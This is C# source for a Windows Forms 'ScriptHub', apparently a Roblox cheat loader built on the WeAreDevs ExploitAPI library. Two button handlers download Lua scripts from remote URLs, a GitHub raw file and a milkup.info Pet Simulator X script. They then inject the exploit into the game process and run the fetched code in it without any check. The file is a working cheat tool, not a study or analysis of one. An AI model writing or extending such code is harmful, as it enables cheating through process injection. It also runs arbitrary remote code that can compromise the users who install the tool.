using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using WeAreDevs_API;

namespace Hewkaw_s_ScriptLoader
{
    public partial class ScriptHub : Form
    {
        ExploitAPI module = new ExploitAPI();
        public ScriptHub()
        {
            InitializeComponent();
        }
        Point lastPoint;

        private void btn_minimized(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void btn_exit(object sender, EventArgs e)
        {
            this.Close();
        }

        private void Point_MouseDown(object sender, MouseEventArgs e)
        {
            lastPoint = new Point(e.X, e.Y);
        }

        private void Point_MouseMove(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                this.Left += e.X - lastPoint.X;
                this.Top += e.Y - lastPoint.Y;
            }
        }

        private void btn_mukurohub(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://raw.githubusercontent.com/xQuartyx/DonateMe/main/ScriptLoader");
            module.LaunchExploit();
            module.SendLuaScript(Script);
        }

        private void btn_millup(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://milkup.info/script/PetSimulatorX/");
            module.LaunchExploit();
            module.SendLuaScript(Script);
        }
    }
}
